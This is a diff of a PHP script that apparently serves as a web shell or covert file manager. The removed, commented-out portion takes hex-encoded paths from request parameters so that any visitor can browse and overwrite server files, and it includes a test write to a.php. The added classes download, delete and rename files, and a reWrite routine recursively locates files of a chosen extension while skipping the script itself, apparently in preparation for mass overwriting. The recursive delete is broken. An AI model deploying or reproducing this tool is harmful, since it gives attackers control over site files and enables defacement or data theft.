@@ -1,128 +1,201 @@
 <?php
-class Files {
-	public $path;
-  	public $array;
-  	public $resource;
-  	public $modes = [
-  		'readonly' 			=> "r",
-  		'readwrite' 		=> "r+",
-  		'writeonly' 		=> "w",
-  		'writemaster' 		=> "w+",
-  		'writeappend' 		=> "a",
-  		'readwriteappend' 	=> "a+"
-  	];
 
-  	function __construct($path) {
-    	$this->path = $path;
-  	}
-  	public function get_path() {
-    	return $this->path;
-  	}
-  	public function scdir() {
-  		return scandir($this->get_path());
-  	}
-  	public static function cd($directory) {
-  		return @chdir($directory);
-  	}
-  	public function ListFile($type) {
-  		$this->array = [];
-  		foreach ($this->scdir() as $key => $value) {
-  			$filename['names'] = $this->get_path() . DIRECTORY_SEPARATOR . $value;
-  			switch ($type) {
-  				case 'dir':
-  					if (!is_dir($filename['names']) || $value === '.' || $value === '..') continue 2;
-  					break;
-  				case 'file':
-  					if (!is_file($filename['names'])) continue 2;
-  					break;
-  			}
-  			$filename['fname'] = basename($filename['names']);
-  			$this->array[] = $filename;
-  		} return $this->array;
-  	}
-  	public function open($filename, $mode) {
-        if (!empty(trim($filename))) {
-            $this->resource = fopen($filename, $this->modes[$mode]);
-            return $this;
-        }
-    }
-    public function write($data) {
-    	return (!empty($data)) ? fwrite($this->resource, $data) : false;
-    }
-    public function read($filename) {
-    	return htmlspecialchars(file_get_contents($filename));
-    }
-    public static function hex($string) {
-    	$str = "";
-    	for ($i=0; $i < strlen($string); $i++) { 
-    		$str .= dechex(ord($string[$i]));
-    	} return $str;
-    }
-    public static function unhex($hex) {
-    	$unhex = "";
-    	for ($i=0; $i < strlen($hex)-1; $i+=2) { 
-    		$unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
-    	} return $unhex;
+class FileSystem
+{
+	protected $path;
+	protected $result = null;
+
+	function __construct($path) {
+		$this->path = $path;
 	}
-}
-/*
-if (isset($_GET['cd'])) {
-	Files::cd(Files::unhex($_GET['cd']));
-}
-$Files = new Files(getcwd());
 
-print($Files->open("a.php", "writeonly")->write('santuuy'));
+	public function MySelf()
+	{
+		return $_SERVER['PHP_SELF'];
+	}
 
-@$_POST['file'] = $Files->unhex($_POST['file']);
-?>
-<table>
-	<?php
-	switch (@$_POST['action']) {
-		case 'edit':
-			if (isset($_POST['submit'])) {
-				$Files->open($_POST['file'], "writeonly")->write($_POST['data']);
+	public function homeRoot()
+	{
+		return $_SERVER['DOCUMENT_ROOT'];
+	}
+
+	public function getPath()
+	{
+		return $this->path;
+	}
+
+	public function isDir($dir)
+	{
+		return  is_dir($dir);
+	}
+
+	public function isFile($file)
+	{
+		return is_file($file);
+	}
+
+	public function scDir()
+	{
+		return scandir($this->path);
+	}
+
+	public function cd($directory)
+	{
+		return chdir($directory);
+	}
+
+	public function getExtension($filename)
+	{
+		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+	}
+
+	public function FileRecursive($dir, &$results = array())
+	{
+		$files = scandir($dir);
+	    foreach($files as $key => $value){
+	        $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
+	        if($this->isDir($path) == false) {
+	            $results[] = $path;
+	        }
+	        else if($value != "." && $value != "..") {
+	            $this->FileRecursive($path, $results);
+	            if($this->isFile($path) == false) {
+	                $results[] = $path;
+	            }   
+	        }
+	    }
+	    return $results;
+	}
+
+	public function reWrite($dir, $extension, $data = null)
+	{
+		if ($this->isWritable($dir)) {
+			foreach ($this->FileRecursive($dir) as $key => $value) {
+				switch ($this->getExtension($value)) {
+					case $extension:
+						if (preg_match('/' . basename($value) . "$/i", $this->MySelf(), $matches) == 0) {
+							return $value;
+						}
+						break;
+				}
 			}
-			?>
-			<tr>
-				<td>Filename : <?= basename($_POST['file']) ?></td>
-			</tr>
-			<form method="post">
-				<tr>
-					<td>
-						<textarea name="data" rows="30" cols="100"><?= $Files->read($_POST['file']) ?></textarea>
-					</td>
-				</tr>
-				<tr>
-					<td>
-						<input type="submit" name="submit">
-						<input type="hidden" name="<?= $_POST['file'] ?>">
-						<input type="hidden" name="action" value="edit">
-					</td>
-				</tr>
-			</form>
-			<?php
-			exit();
-			break;
+		}
 	}
-	print("<a href='?cd=".$Files->hex(dirname($Files->get_path()))."'>back</a>");
-	foreach ($Files->ListFile("dir") as $key => $value) { ?>
-		<tr>
-			<td>
-				<a href="?cd=<?= $Files->hex($value['names']) ?>"><?= $value['fname'] ?></a>
-			</td>
-			<td></td>
-		</tr>
-	<?php }
-	foreach ($Files->ListFile("file") as $key => $value) { ?>
-		<tr>
-			<td><?= $value['fname'] ?></td>
-			<form method="post">
-				<td>
-					<button name="action" value="edit">edit</button>
-					<input type="hidden" name="file" value="<?= $Files->hex($value['names']) ?>">
-				</td>
-			</form>
-		</tr>
-	<?php }
-	?>
-</table>*/
+
+	public function Dir()
+	{
+		$this->result = [];
+		foreach ($this->scDir() as $key => $value) {
+			$filename = [
+				"pathName" 		=> $this->path . DIRECTORY_SEPARATOR . $value,
+				"singlePath"	=> $value
+			];
+			if (!$this->isDir($filename['pathName']) || $value === '.' || $value === '..') continue;
+			$this->result[] = $filename;
+		} return $this->result;
+	}
+
+	public function File()
+	{
+		$this->result = [];
+		foreach ($this->scDir() as $key => $value) {
+			$filename = [
+				"pathName" 		=> $this->path . DIRECTORY_SEPARATOR . $value,
+				"singlePath"	=> $value
+			];
+			if (!$this->isFile($filename['pathName']) || $value === '.' || $value === '..') continue;
+			$this->result[] = $filename;
+		} return $this->result;
+	}
+
+}
+
+/**
+ * 
+ */
+class Action extends FileSystem
+{
+	protected $resource;
+	protected $mode;
+	protected $modes = [
+		'readOnly'        => 'r',
+        'readWrite'       => 'r+',
+        'writeOnly'       => 'w',
+        'writeMaster'     => 'w+',
+        'writeAppend'     => 'a',
+        'readWriteAppend' => 'a+',
+	];
+	
+	function __construct(protected $filename,) 
+	{
+		parent::__construct(getcwd());
+	}
+
+	public function download()
+	{
+		if ($this->isFile($this->filename)) {
+			header("Content-Type: application/octet-stream");
+			header('Content-Transfer-Encoding: binary');
+			header("Content-length: ".filesize($this->filename));
+			header("Cache-Control: no-cache");
+			header("Pragma: no-cache");
+			header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");
+
+			$handle = fopen($this->filename, "rb");
+			while (!feof($handle)) {
+				print(fread($handle, 1024*8));
+				@ob_flush();
+				@flush();
+			}
+			fclose($handle);
+		}
+	}
+
+	public function delete()
+	{
+		if ($this->isDir($this->filename)) {
+			foreach ($this->scDir() as $key => $value) {
+				if ($value != "." && $value != '..') {
+					if ($this->isDir($this->filename)) {
+						$this->delete($this->filename . DIRECTORY_SEPARATOR . $value);
+					} else {
+						unlink($this->filename . DIRECTORY_SEPARATOR . $value);
+					}
+				}
+			}
+			if (@rmdir($this->filename)) {
+				return true;
+			} else {
+				return false;
+			}
+		} else {
+			if (@unlink($this->filename)) {
+				return true;
+			} else {
+				return false;
+			}
+		}
+	}
+	public function renames($newname)
+	{
+		return rename($this->filename, $this->getPath() . DIRECTORY_SEPARATOR . $newname);
+	}
+
+	public function open($mode)
+	{
+		if (!empty(trim($this->filename))) {
+			$this->resource = fopen($this->filename, $this->modes[$mode]);
+			return $this->resource;
+		}
+	}
+
+	public function read()
+	{
+		return htmlspecialchars(file_get_contents($this->filename));
+	}
+
+	public function write($data)
+	{
+		return (!empty($data)) ? fwrite($this->resource, $data) : false;
+	}
+}	
